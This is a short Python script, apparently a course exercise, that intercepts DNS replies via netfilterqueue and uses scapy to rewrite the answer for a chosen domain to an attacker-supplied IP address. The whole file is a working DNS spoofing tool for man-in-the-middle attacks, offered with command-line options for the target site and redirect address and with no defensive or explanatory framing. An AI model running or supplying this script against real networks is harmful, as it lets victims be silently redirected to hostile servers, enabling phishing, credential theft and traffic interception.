import netfilterqueue
import scapy.all as scapy
import optparse

site = ""
target = ""

def get_arguments():
    global site, target

    parser = optparse.OptionParser()
    parser.add_option("-s", "--site", dest = "site", help = "Site to be spoofed.")
    parser.add_option("-t", "--target", dest = "target", help = "Target.")
    (options, arguments) = parser.parse_args()

    if not options.site:
        parser.error("[-] Please specify a site, use --help for more info.")
    elif not options.target:
        parser.error("[-] Please specify a target, use --help for more info.")

    site = options.site
    target = options.target

def process_packet(packet):
    global site, target

    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if site in qname:
            print("\033[92m[+]\033[0m Spoofing target")
            answer = scapy.DNSRR(rrname = qname, rdata = target)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(str(scapy_packet))

    packet.accept()

get_arguments()
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
